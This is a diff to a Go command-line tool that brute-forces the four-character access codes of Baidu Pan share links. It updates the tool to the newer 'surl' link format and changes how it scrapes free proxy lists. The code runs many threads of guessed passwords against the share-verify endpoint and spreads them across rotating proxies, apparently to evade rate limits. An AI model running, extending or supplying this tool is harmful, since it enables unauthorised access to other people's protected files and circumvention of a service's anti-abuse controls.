@@ -1,11 +1,8 @@
 package main
 
 import (
-	"bufio"
 	"encoding/json"
 	"fmt"
-	"gopkg.in/alecthomas/kingpin.v2"
-	"gopkg.in/cheggaaa/pb.v1"
 	"io/ioutil"
 	"log"
 	"math/rand"
@@ -19,6 +16,9 @@ import (
 	"strings"
 	"sync"
 	"time"
+
+	"gopkg.in/alecthomas/kingpin.v2"
+	"gopkg.in/cheggaaa/pb.v1"
 )
 
 const (
@@ -29,20 +29,20 @@ const (
 )
 
 var (
-	link        = kingpin.Arg("link", "URL of BaiduYun file you want to get.").Required().String()
-	preset      = kingpin.Flag("preset", "The preset start of key to brute.").Short('p').Default("0000").String()
-	thread      = kingpin.Flag("thread", "Number of threads.").Short('t').Default("1000").Int64()
-	resolver    []*Resolve
-	bar         *pb.ProgressBar
-	shareid, uk string
-	start       int64
-	refer       string
-	wg          sync.WaitGroup
-	proxies     map[Proxy]int
-	updater     []*Proxies
-	mapLocker   *sync.Mutex
-	useable     *AtomBool
-	nullP       Proxy
+	link      = kingpin.Arg("link", "URL of BaiduYun file you want to get.").Required().String()
+	preset    = kingpin.Flag("preset", "The preset start of key to brute.").Short('p').Default("0000").String()
+	thread    = kingpin.Flag("thread", "Number of threads.").Short('t').Default("1000").Int64()
+	resolver  []*Resolve
+	bar       *pb.ProgressBar
+	surl      string
+	start     int64
+	refer     string
+	wg        sync.WaitGroup
+	proxies   map[Proxy]int
+	updater   []*Proxies
+	mapLocker *sync.Mutex
+	useable   *AtomBool
+	nullP     Proxy
 )
 
 type Info struct {
@@ -129,70 +129,6 @@ func saveProxies() {
 		&Proxies{
 			func() {
 				for {
-					resp, err := http.Get("http://api.xicidaili.com/free2016.txt")
-					if err != nil {
-						log.Println(err)
-						time.Sleep(RETRY_TIME)
-						continue
-					}
-					sca := bufio.NewScanner(resp.Body)
-					for sca.Scan() {
-						spl := strings.Split(sca.Text(), ":")
-						if len(spl) != 2 {
-							log.Fatal("Unexpected error: ", sca.Text())
-						}
-						ne := Proxy{"http", spl[0], spl[1]}
-						addProxy(ne)
-					}
-					resp.Body.Close()
-					time.Sleep(15 * time.Minute)
-				}
-			},
-		})
-	updater = append(updater,
-		&Proxies{
-			func() {
-				for {
-					resp, err := http.Get("http://proxy.tekbreak.com/1000/json")
-					if err != nil {
-						log.Println(err)
-						time.Sleep(RETRY_TIME)
-						continue
-					}
-					var sca []struct {
-						IP   string `json:"ip"`
-						Port string `json:"port"`
-						Type string `json:"type"`
-					}
-					if err := json.NewDecoder(resp.Body).Decode(&sca); err != nil {
-						log.Println(err)
-						time.Sleep(RETRY_TIME)
-						continue
-					}
-					for _, i := range sca {
-						ne := Proxy{addr: i.IP, port: i.Port}
-						ignore := false
-						switch i.Type {
-						case "HTTP":
-							ne.typ = "http"
-						case "HTTPS":
-							ne.typ = "https"
-						default:
-							ignore = true
-						}
-						if !ignore {
-							addProxy(ne)
-						}
-					}
-					resp.Body.Close()
-					time.Sleep(5 * time.Minute)
-				}
-			},
-		})
-	updater = append(updater,
-		&Proxies{
-			func() {
-				for {
 					resp, err := http.Get("https://free-proxy-list.net/")
 					if err != nil {
 						log.Println(err)
@@ -206,7 +142,7 @@ func saveProxies() {
 						time.Sleep(RETRY_TIME)
 						continue
 					}
-					re, _ := regexp.Compile(`<tr><td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td><td>.*</td><td>.*</td><td>.*</td><td>.*</td><td>(yes|no)</td><td>.*</td></tr>`)
+					re, _ := regexp.Compile(`<tr><td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td><td>.*?</td><td class="hm">.*?</td><td>.*?</td><td class="hm">.*?</td><td class="hx">(yes|no)</td><td class="hm">.*?</td></tr>`)
 					sca := re.FindAllStringSubmatch(string(conte), -1)
 					for _, i := range sca {
 						if len(i) != 4 {
@@ -241,7 +177,7 @@ func saveProxies() {
 						time.Sleep(RETRY_TIME)
 						continue
 					}
-					re, _ := regexp.Compile(`<tr><td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>.*</tr>`)
+					re, _ := regexp.Compile(`<tr><td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>.*?</tr>`)
 					sca := re.FindAllStringSubmatch(string(conte), -1)
 					for _, i := range sca {
 						if len(i) != 3 {
@@ -265,24 +201,21 @@ func next(now string, count int64) int64 {
 }
 
 func saveResolver() {
-	re1, _ := regexp.Compile(`//pan\.baidu\.com/share/init\?shareid=(\d+)&uk=(\d+)`)
 	resolver = append(resolver,
 		&Resolve{
-			re1,
+			regexp.MustCompile(`//pan\.baidu\.com/share/init\?surl=([a-zA-Z0-9]+)`),
 			func(re *regexp.Regexp, ori string) {
 				ret := re.FindStringSubmatch(ori)
-				if len(ret) != 3 {
+				if len(ret) != 2 {
 					log.Fatal("Unexpected error: ", ori)
 				}
-				shareid = ret[1]
-				uk = ret[2]
+				surl = ret[1]
 				refer = ori
 			},
 		})
-	re2, _ := regexp.Compile(`//pan\.baidu\.com/s/[a-zA-Z0-9]+`)
 	resolver = append(resolver,
 		&Resolve{
-			re2,
+			regexp.MustCompile(`//pan\.baidu\.com/s/[a-zA-Z0-9]+`),
 			func(re *regexp.Regexp, ori string) {
 				jar, _ := cookiejar.New(nil)
 				session := &http.Client{
@@ -304,7 +237,7 @@ func saveResolver() {
 						if resolver[0].re.MatchString(resp.Header.Get("Location")) {
 							resolver[0].fun(resolver[0].re, resp.Header.Get("Location"))
 						} else {
-							log.Fatal("Unexpected error: ", ori, resp.Header.Get("Location"))
+							log.Fatalf("Unexpected error: %s %s", ori, resp.Header.Get("Location"))
 						}
 						break
 					}
@@ -331,7 +264,7 @@ func builder(now string) (*http.Response, Proxy, error) {
 		Timeout:   TIMEOUT,
 		Transport: &http.Transport{Proxy: http.ProxyURL(par)},
 	}
-	req, err := http.NewRequest("POST", fmt.Sprintf("https://pan.baidu.com/share/verify?shareid=%s&uk=%s", shareid, uk), strings.NewReader(fmt.Sprintf("pwd=%04s&vcode=&vcode_str=", now)))
+	req, err := http.NewRequest("POST", fmt.Sprintf("https://pan.baidu.com/share/verify?surl=%s", surl), strings.NewReader(fmt.Sprintf("pwd=%04s&vcode=&vcode_str=", now)))
 	if err != nil {
 		log.Fatal(err)
 	}
